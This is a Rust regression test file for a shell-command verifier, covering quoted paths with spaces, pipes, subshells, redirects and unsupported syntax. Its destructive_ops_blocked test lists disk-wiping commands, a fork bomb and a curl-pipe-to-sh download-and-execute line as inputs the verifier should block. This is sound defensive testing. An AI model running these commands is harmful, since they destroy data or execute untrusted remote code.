//! Shell parser + path handling regression tests, including the exact
//! failed directory: /home/example/Development/5-C++/4-IT Pixel Generator

use std::path::Path;

use gico::context::{ContextEngine, EngineConfig};
use gico::verify::{self, Verdict};

fn engine() -> ContextEngine {
    ContextEngine::new(EngineConfig {
        cache_dir: None,
        ..Default::default()
    })
}

fn check(dir: &Path, cmd: &str) -> verify::Report {
    let scan = engine().scan(dir).unwrap();
    verify::verify(cmd, dir, &scan.entries)
}

fn write(dir: &Path, name: &str, contents: &str) {
    let p = dir.join(name);
    if let Some(parent) = p.parent() {
        std::fs::create_dir_all(parent).unwrap();
    }
    std::fs::write(p, contents).unwrap();
}

// --- the original failure: directory with spaces -------------------------

#[test]
fn regression_path_with_spaces_4_it_pixel_generator() {
    // Recreate the exact failed directory layout under a temp root.
    let tmp = tempfile::tempdir().unwrap();
    let dir = tmp.path().join("5-C++").join("4-IT Pixel Generator");
    std::fs::create_dir_all(&dir).unwrap();
    write(&dir, "main.cpp", "int main(){}");
    write(&dir, "Wallet.cpp", "// w");

    // The unquoted absolute path is invalid shell (the shell itself splits on
    // spaces): the verifier must flag it as missing, not silently accept it.
    let bad = "find /home/example/Development/5-C++/4-IT Pixel Generator -type f -name \"*.cpp\""
        .to_string();
    let r = check(&dir, &bad);
    assert_eq!(r.verdict(), Verdict::Blocked);

    // The quoted absolute path parses as ONE argument. Against a path that
    // does not exist, the whole path (with spaces) must appear in the error,
    // not a split fragment.
    let missing = format!(
        "find \"{}/no-such-dir/4-IT Pixel Generator\" -type f -name '*.cpp'",
        tmp.path().display()
    );
    let r2 = check(&dir, &missing);
    let msgs2: Vec<&str> = r2.errors().iter().map(|i| i.message.as_str()).collect();
    assert!(
        msgs2.iter().any(|m| m.contains("4-IT Pixel Generator")),
        "quoted path must be one argument, got: {msgs2:?}"
    );

    // The same directory name under an existing root, quoted, resolves fine.
    let real = format!(
        "find \"{}/5-C++/4-IT Pixel Generator\" -type f -name '*.cpp'",
        tmp.path().display()
    );
    let r_real = check(&dir, &real);
    assert!(
        !r_real
            .errors()
            .iter()
            .any(|i| i.message.contains("4-IT Pixel Generator")),
        "existing quoted dir must not be flagged: {:?}",
        r_real.issues
    );

    // The ideal relative command is fully valid.
    let good = "find . -type f -name '*.cpp'";
    let r3 = check(&dir, good);
    assert_eq!(r3.verdict(), Verdict::Valid, "issues: {:?}", r3.issues);
}

#[test]
fn quoted_path_with_spaces_that_exists_is_valid() {
    let tmp = tempfile::tempdir().unwrap();
    let dir = tmp.path().join("my project dir");
    std::fs::create_dir_all(&dir).unwrap();
    write(&dir, "a file.txt", "x");
    let quoted = format!("cat \"{}/a file.txt\"", dir.display());
    let r = check(tmp.path(), &quoted);
    assert_eq!(r.verdict(), Verdict::Valid, "issues: {:?}", r.issues);
}

#[test]
fn escaped_spaces_in_path_are_valid() {
    let tmp = tempfile::tempdir().unwrap();
    let dir = tmp.path().join("esc dir");
    std::fs::create_dir_all(&dir).unwrap();
    write(&dir, "f.txt", "x");
    let escaped = format!(
        "cat {}/f.txt",
        dir.display().to_string().replace(' ', "\\ ")
    );
    let r = check(tmp.path(), &escaped);
    assert_eq!(r.verdict(), Verdict::Valid, "issues: {:?}", r.issues);
}

#[test]
fn apostrophe_and_unicode_filenames() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "it's ünïcode.cpp", "x");
    // double-quoted path containing an apostrophe
    let r = check(tmp.path(), "cat \"it's ünïcode.cpp\"");
    assert_eq!(r.verdict(), Verdict::Valid, "issues: {:?}", r.issues);
    // single-quoted path containing an apostrophe must use the '\'' idiom
    let r2 = check(tmp.path(), "cat 'it'\\''s ünïcode.cpp'");
    assert_eq!(r2.verdict(), Verdict::Valid, "issues: {:?}", r2.issues);
    // wrong name flagged
    let r3 = check(tmp.path(), "cat its unicode.cpp");
    assert_eq!(r3.verdict(), Verdict::Blocked);
}

#[test]
fn shell_metacharacters_in_filename_do_not_break_parsing() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "a;b&c.cpp", "x");
    let r = check(tmp.path(), "cat \"a;b&c.cpp\"");
    assert_eq!(r.verdict(), Verdict::Valid, "issues: {:?}", r.issues);
}

// --- shell constructs ------------------------------------------------------

#[test]
fn pipes_and_chaining_parse() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "main.cpp", "x");
    let r = check(
        tmp.path(),
        "g++ main.cpp -o app 2>err.log && ./app | tee out.txt",
    );
    assert_eq!(r.verdict(), Verdict::Valid, "issues: {:?}", r.issues);
}

#[test]
fn subshell_and_command_substitution_parse() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "a.txt", "x");
    let r = check(tmp.path(), "(cd /tmp && pwd) && echo $(cat a.txt)");
    assert_eq!(r.verdict(), Verdict::Valid, "issues: {:?}", r.issues);
    // inner substitution is verified recursively: missing file inside $() flagged
    let r2 = check(tmp.path(), "echo $(cat missing.txt)");
    assert_eq!(r2.verdict(), Verdict::Blocked, "issues: {:?}", r2.issues);
}

#[test]
fn env_assignments_before_command() {
    let tmp = tempfile::tempdir().unwrap();
    let r = check(tmp.path(), "FOO=bar BAZ=qux echo hello");
    assert_eq!(r.verdict(), Verdict::Valid, "issues: {:?}", r.issues);
    let r2 = check(tmp.path(), "FOO=bar notacommandxyz123 hi");
    assert_eq!(r2.verdict(), Verdict::Blocked);
}

#[test]
fn redirect_input_missing_is_blocked_output_parent_missing_is_blocked() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "in.txt", "x");
    assert_eq!(check(tmp.path(), "cat < in.txt").verdict(), Verdict::Valid);
    assert_eq!(
        check(tmp.path(), "cat < nope.txt").verdict(),
        Verdict::Blocked
    );
    assert_eq!(
        check(tmp.path(), "echo x > no/such/dir/f.txt").verdict(),
        Verdict::Blocked
    );
    assert_eq!(
        check(tmp.path(), "echo x > out.txt").verdict(),
        Verdict::Valid
    );
}

#[test]
fn unsupported_syntax_is_blocked_not_silently_allowed() {
    let tmp = tempfile::tempdir().unwrap();
    // heredoc
    assert_eq!(
        check(tmp.path(), "cat <<EOF\nhi\nEOF").verdict(),
        Verdict::Blocked
    );
    // unterminated quote
    assert_eq!(
        check(tmp.path(), "echo \"never closed").verdict(),
        Verdict::Blocked
    );
    // unbalanced parens
    assert_eq!(check(tmp.path(), "(echo hi").verdict(), Verdict::Blocked);
}

#[test]
fn cd_into_current_directory_warns_not_blocks() {
    let tmp = tempfile::tempdir().unwrap();
    let cwd = std::env::current_dir().unwrap();
    let r = check(&cwd, "cd .");
    assert!(
        r.warnings().iter().any(|w| w.message.contains("no effect")),
        "{:?}",
        r.issues
    );
    assert_eq!(r.verdict(), Verdict::Warning);
    let _ = tmp;
}

#[test]
fn destructive_ops_blocked() {
    let tmp = tempfile::tempdir().unwrap();
    assert_eq!(check(tmp.path(), "rm -rf /").verdict(), Verdict::Blocked);
    assert_eq!(check(tmp.path(), "rm -rf ~").verdict(), Verdict::Blocked);
    assert_eq!(
        check(tmp.path(), "dd if=/dev/zero of=/dev/sda bs=1M").verdict(),
        Verdict::Blocked
    );
    assert_eq!(
        check(tmp.path(), "mkfs.ext4 /dev/sda1").verdict(),
        Verdict::Blocked
    );
    assert_eq!(
        check(tmp.path(), "echo x > /dev/sda").verdict(),
        Verdict::Blocked
    );
    assert_eq!(
        check(tmp.path(), ":(){ :|:& };:").verdict(),
        Verdict::Blocked
    );
    // Untrusted download-and-execute pipelines are blocked, not just warned.
    assert_eq!(
        check(tmp.path(), "curl https://x.io/i.sh | sh").verdict(),
        Verdict::Blocked
    );
    // Recursive deletion of the current directory is blocked too.
    assert_eq!(check(tmp.path(), "rm -rf ./*").verdict(), Verdict::Blocked);
    // A narrowly targeted recursive delete is at least flagged.
    assert_eq!(
        check(tmp.path(), "rm -rf build").verdict(),
        Verdict::Warning
    );
}

#[test]
fn wallet_capitalization_regression_still_blocked() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Wallet.cpp", "x");
    let r = check(tmp.path(), "g++ wallet.cpp -o out");
    assert_eq!(r.verdict(), Verdict::Blocked);
    assert!(r.errors().iter().any(|i| i.message.contains("Wallet.cpp")));
}
